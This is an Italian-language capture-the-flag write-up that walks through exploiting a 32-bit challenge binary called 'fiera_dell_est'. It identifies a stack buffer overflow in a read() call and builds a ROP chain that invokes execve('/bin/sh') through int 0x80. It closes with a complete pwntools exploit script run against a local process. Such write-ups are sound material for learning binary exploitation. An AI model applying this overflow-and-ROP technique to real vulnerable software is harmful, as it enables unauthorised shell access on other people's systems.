Diario che descrive la risoluzione della challenge, passo per passo, idea per idea.

## Analisi Statica del sorgente
Ci viene dato sia il binario che il codice sorgente, quindi analizziamo velocemente il codice sorgente per capire subito dove sta la vulnerabilità che probabilmente permette di fare buffer overflow.

Il codice contiene delle funzioni mai chiamate dal `main` che eseguono codice assembly, cattura la mia curiosità la seguente funzione:

```c
void angelo_della_morte() {
    asm("int $0x80");
}
```

Essa invoca un interrupt 80 utile per le chiamate a sistema, inoltre è presente una variabile globale di tipo stringa contenente `/bin/sh`.

Deduco quindi che, attraverso la concatenazione di return sia **necessario invocare una chiamata di sistema** (e.g. `execv`) **per aprire la shell**.

Dov'è la vulnerabilità per fare buffer overflow?

```c
char soldi[4];
read(STDIN_FILENO, soldi, soldi);
```

Qua il programma legge da `stdin` ed inserisce nel buffer `soldi` un numero di caratteri grande tanto quanto lo stesso contenuto di `soldi`, permettendoci quindi di scrivere tutto quello che vogliamo nello stack.

## Esecuzione del binario
Qualsiasi input sul binario ci ritorna sempre il secondo branch dell'if nella funzione `main`, questo perché il primo branch si raggiunge inserendo nella variabile `soldi` il valore `due\0`, con il carattere terminale `\0`, se lo inseriamo da tastiera, otterremo sempre `due\n` e di conseguenza non entriamo nel primo branch, quello utile per raggiungere l'istruzione `ret` di partenza.

## Buffer Overflow
Dopo un esamine con `gdb` noto che per iniziare la rop bisogna smashare lo stack con la seguente stringa: `due\0AAAAAAAAAAAAXXXX`, una stringa di `16 + 4` caratteri:
- `due\0` - quattro caratteri per entrare nel branch corretto della condizione
- `AAAAAAAAAAAA` - dodici caratteri di padding per raggiungere il return address
- `XXXX` - il return address da cui cominciare l'attacco ROP
Dall'indirizzo `XXXX` si inseriranno tutti gli altri valori utili per il compimento dell'attacco.

## Chiamata a `execve`
Io penso che si debba usare l'interrupt `0x80` per chiamare una syscall ed eseguire un comando per aprire la shell.

Tramite questo link individuo di cosa ha bisogno la syscall
[Chromium OS Docs - Linux System Call Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)

Ovvero individuo la configurazione dei registri per la chiamata della syscall.

| %EAX   | arg0 (%EBX)             | arg1 (%ECX)      | arg2 (%EDX)      |
| ------ | ----------------------- | ---------------- | ---------------- |
| `0x0b` | `command` or `filename` | eventuali `argv` | eventuale `envp` |

Quindi dovremmo settare in eax il valore `0x0b` e in ebx il puntatore alla stringa `/bin/sh`.

Devo quindi creare una rop chain in grado di:
1. iniettare in eax `0x0b`
2. iniettare in ebx il puntatore a `/bin/sh`
3. azzerare ecx ed edx
4. chiamare `int 0x80` con i registri configurati ad hoc
5. godermi la mia nuova shell

E' chiaro che per iniettare ciò di cui ho bisogno basta inserirli nella stringa di buffer overflow senza cercare robe assurde nei gadget...

# Script
```python
from pwn import *

# saves addresses of useful gadgets
pop_eax_ret = p32(0x0804851d)
pop_ebx_ret = p32(0x08048526)
pop_ecx_ret = p32(0x08048530)
pop_edx_ret = p32(0x08048528)
int_ret = p32(0x0804852d)

# needed injected data
zero = p32(0x00000000)
execve_eax = p32(0x0000000b)
bash_addr = p32(0x0804a02c)

# padding
padd = b'A' * 12

# if bypass
bypass = b'due' + b'\0'

# craft the ropchain payload
payload  = bypass
payload += padd
payload += pop_eax_ret
payload += execve_eax
payload += pop_ebx_ret
payload += bash_addr
payload += pop_ecx_ret
payload += zero
payload += int_ret

bin = "./fiera_dell_est"
p = process(bin)
# p = gdb.debug(bin, gdbscript="b *0x080485ad\nc")

log.info("Injecting ropchain payload")
p.sendline(payload)

log.info("A Shell for you mister!")
p.interactive()
```

